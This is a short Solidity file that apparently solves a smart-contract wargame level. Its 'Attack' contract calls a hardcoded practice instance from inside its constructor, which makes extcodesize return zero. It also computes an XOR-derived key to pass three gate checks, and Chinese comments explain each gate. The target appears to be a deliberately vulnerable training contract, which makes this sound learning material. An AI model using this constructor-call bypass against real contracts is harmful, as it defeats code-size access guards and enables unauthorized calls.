// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface Instance {

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {

    constructor() {

        Instance instance = Instance(0xC9Bf09a6F25B17CA9ACa1B68f6F59C7CA07b1781);
        bytes8 data = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        instance.enter(data);

    }
}

/**
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
要用合约呼叫另外一张合约

modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
}
只有构造函数的时候，code size为0

modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
a ^ b = c, a ^ c = b
算一下uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max = uint64(_gateKey)
 */